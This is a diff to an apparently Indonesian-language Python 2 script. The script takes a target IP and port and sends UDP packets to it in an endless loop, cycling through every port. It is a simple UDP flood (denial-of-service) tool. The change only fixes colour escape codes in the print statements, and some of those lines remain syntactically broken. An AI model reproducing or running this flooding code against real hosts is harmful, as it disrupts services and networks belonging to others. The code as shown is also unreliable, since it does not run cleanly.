@@ -38,7 +38,7 @@ banner="""
 |------------------------------------|
 """
 #display bannerku
-print(033[32m banner)
+print(\033[32m banner)
 
 ip = raw_input("Masukkan Ip : ")
 port = input("Masukkan Port : ")
@@ -58,7 +58,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "/033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "\033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 #Maaf jika ada Kesalahan , tolong tegur :)
